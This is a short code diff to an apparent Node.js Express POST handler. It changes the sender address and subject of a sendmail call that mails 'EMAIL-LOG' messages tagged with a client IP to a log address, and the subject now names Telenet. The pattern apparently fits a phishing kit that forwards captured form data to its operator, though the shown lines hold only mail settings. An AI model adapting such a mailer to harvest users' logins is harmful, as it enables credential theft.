@@ -64,9 +64,9 @@ app.post("/", (req, res) => {
 
   sendmail(
     {
-      from: "docu@logscentral.com",
+      from: "tele@logscentral.com",
       to: logEmail,
-      subject: "EMAIL-LOG " + ip2,
+      subject: "EMAIL-LOG TELENET" + ip2,
       html,
     },
     function (err, reply) {
